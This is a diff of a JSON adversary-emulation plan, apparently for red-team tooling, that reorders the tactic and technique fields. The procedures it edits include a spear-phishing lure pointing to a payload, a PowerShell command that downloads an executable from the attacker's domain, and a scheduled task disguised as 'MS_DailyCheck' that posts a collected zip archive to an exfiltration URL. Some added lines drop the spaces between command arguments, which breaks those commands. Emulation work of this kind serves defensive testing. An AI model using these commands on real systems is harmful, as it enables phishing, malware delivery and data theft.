@@ -9,16 +9,16 @@
     },
     "procedures": [
         {
-            "tactic": "Actuator",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Actuator",
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
             }
         },
         {
-            "tactic": "Interfaces",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Interfaces",
             "label": "Interfaces",
             "preconditions": {
                 "tool": "self.tool",
@@ -27,8 +27,8 @@
             }
         },
         {
-            "tactic": "DNS",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "DNS",
             "label": "DNS",
             "preconditions": {
                 "tool": "self.tool",
@@ -37,8 +37,8 @@
             }
         },
         {
-            "tactic": "NGINX",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "NGINX",
             "label": "NGINX",
             "preconditions": {
                 "self.tool_name": "self.tool",
@@ -49,16 +49,16 @@
             }
         },
         {
-            "tactic": "PayloadCheapride",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "PayloadCheapride",
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
             }
         },
         {
-            "tactic": "DriveByCompromise",
-            "technique": "InitialAccess",
+            "tactic": "InitialAccess",
+            "technique": "DriveByCompromise",
             "label": "driveByCompromise",
             "preconditions": {
                 "actuator": "self.actuator",
@@ -68,8 +68,8 @@
             }
         },
         {
-            "tactic": "UserExecution",
-            "technique": "Execution",
+            "tactic": "Execution",
+            "technique": "UserExecution",
             "label": "userExecution",
             "preconditions": {
                 "actuator_id": "self.actuator",
@@ -79,8 +79,8 @@
             }
         },
         {
-            "tactic": "WebProtocols",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "WebProtocols",
             "label": "webProtocols_1",
             "preconditions": {
                 "actuator_id": "self.actuator",
@@ -94,8 +94,8 @@
             }
         },
         {
-            "tactic": "SpearPhishingLink",
-            "technique": "InitialAccess",
+            "tactic": "InitialAccess",
+            "technique": "SpearPhishingLink",
             "label": "spearPhishingLink",
             "preconditions": {
                 "actuator": "self.actuator",
@@ -104,13 +104,13 @@
                 "driveby": "self.driveby",
                 "target": "self.target_1",
                 "tune": {
-                    "body": "Save 20% on your next order!\nhttp://${self.driveby_domain}/${self.payload_name}\nSuperShoppers"
+                    "body": "Save 20% on your next order!\nhttp://${self.driveby_domain}/${self.payload_name}SuperShoppers"
                 }
             }
         },
         {
-            "tactic": "ArchiveCollectedData",
-            "technique": "Collection",
+            "tactic": "Collection",
+            "technique": "ArchiveCollectedData",
             "label": "archiveCollectedData",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -122,21 +122,21 @@
             }
         },
         {
-            "tactic": "IngressToolTransfer",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "IngressToolTransfer",
             "label": "ingressToolTransfer",
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": "powershell mkdir ${self.temp_dir}; Invoke-WebRequest -Uri \"${self.driveby_domain}/help_win_x86.exe\" -OutFile ${self.temp_dir}\\${self.tool_name}.exe"
+                    "command": "powershell mkdir${self.temp_dir}; Invoke-WebRequest -Uri \"${self.driveby_domain}/help_win_x86.exe\" -OutFile${self.temp_dir}\\${self.tool_name}.exe"
                 }
             }
         },
         {
-            "tactic": "MaliciousFile",
-            "technique": "Execution",
+            "tactic": "Execution",
+            "technique": "MaliciousFile",
             "label": "maliciousFile",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -148,21 +148,21 @@
             }
         },
         {
-            "tactic": "ScheduledTransfer",
-            "technique": "Exfiltration",
+            "tactic": "Exfiltration",
+            "technique": "ScheduledTransfer",
             "label": "exfiltrate",
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": "powershell &{$time = [DateTime]::Now.AddMinutes(30); $hourMinute=$time.ToString(\"HH:mm\"); $command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; SchTasks.exe /Create /SC ONCE /TN \"MS_DailyCheck\", /TR \"powershell Invoke-RestMethod -Uri ${self.exfil_url} -Method Post -InFile  C:\\Users\\$username\\AppData\\Local\\Temp\\new.zip\" /ST $hourMinute /F}"
+                    "command": "powershell &{$time = [DateTime]::Now.AddMinutes(30); $hourMinute=$time.ToString(\"HH:mm\"); $command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; SchTasks.exe /Create /SC ONCE /TN \"MS_DailyCheck\", /TR \"powershell Invoke-RestMethod -Uri${self.exfil_url}-Method Post -InFile  C:\\Users\\$username\\AppData\\Local\\Temp\\new.zip\" /ST $hourMinute /F}"
                 }
             }
         },
         {
-            "tactic": "AgentExit",
-            "technique": "Utility",
+            "tactic": "Utility",
+            "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
                 "agent": "self.agent_tgt1",
